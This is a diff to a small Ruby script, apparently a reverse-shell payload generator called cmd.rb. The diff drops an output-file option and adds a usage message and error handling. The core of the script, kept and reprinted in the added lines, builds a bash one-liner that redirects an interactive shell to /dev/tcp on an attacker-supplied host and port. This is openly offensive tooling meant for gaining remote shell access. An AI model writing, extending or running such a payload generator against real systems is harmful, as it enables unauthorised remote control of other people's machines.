@@ -33,7 +33,6 @@ OptionParser.new do |opt|
   opt.on('-h', '--local-host <local_host>', 'Local host.') { |o| options.local_host = o }
   opt.on('-p', '--local-port <local_port>', 'Local port.') { |o| options.local_port = o }
   opt.on('-s', '--target-shell <target_shell>', 'Target shell.') { |o| options.target_shell = o }
-  opt.on('-o', '--output-file <output_file>', 'Output file.') { |o| options.output_file = o }
 end.parse!
 
 host = options.local_host
@@ -41,5 +40,20 @@ port = options.local_port
 shell = options.target_shell
 file = options.output_file
 
-sleep(0.5)
-puts "#{r}#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &"
+if host == "" or port == "" or shell == ""
+    puts "Usage: cmd.rb --local-host=<local_host> --local-port=<local_port>"
+    puts "              --target-shell=<target_shell>"
+    puts ""
+    puts "  --local-host=<local_host>      Local host."
+    puts "  --local-port=<local_port>      Local port."
+    puts "  --target-shell=<target_shell>  Target shell."
+end
+  
+begin
+    sleep(0.5)
+    puts "#{g}Writing payload..."
+    sleep(1)
+    puts "#{r}#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &"
+rescue
+    puts "#{e}Failed to write payload!"
+end
